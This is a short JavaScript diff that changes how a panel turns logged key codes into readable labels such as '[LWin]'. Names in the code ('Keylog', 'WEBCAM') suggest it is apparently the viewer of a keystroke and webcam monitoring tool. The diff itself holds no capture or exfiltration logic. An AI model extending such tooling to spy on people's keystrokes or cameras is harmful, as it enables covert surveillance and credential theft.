@@ -539,12 +539,8 @@ document.addEventListener('DOMContentLoaded', () => {
             isKeylogClean = false;
         }
 
-        if (keyCode == 8) {
-            el.textContent = el.textContent.slice(0, -1);
-            return;
-        }
-
         function translateKeyCode(code) {
+            if (code == 8) return;
             if (code >= 65 && code <= 90) return String.fromCharCode(code);
             if (code >= 48 && code <= 57) return String.fromCharCode(code);
             if (code >= 96 && code <= 105) return `[Num ${code - 96}]`;
@@ -583,6 +579,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     return '[Insert]';
                 case 46:
                     return '[Delete]';
+                case 91:
+                    return '[LWin]';
+                case 92:
+                    return '[RWin]';
+                case 93:
+                    return '[Menu]';
                 case 106:
                     return '[Num *]';
                 case 107:
@@ -652,20 +654,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     return ']';
                 case 222:
                     return "'";
-                case 91:
-                    return '[LWin]';
-                case 92:
-                    return '[RWin]';
-                case 93:
-                    return '[Menu]';
                 default:
                     return `[${code}]`;
             }
         }
 
         const char = translateKeyCode(keyCode);
-        el.textContent += char;
-        el.scrollTop = el.scrollHeight;
+        if (char) {
+            el.textContent += char;
+            el.scrollTop = el.scrollHeight;
+        }
     }
 
     // --- WEBCAM ---
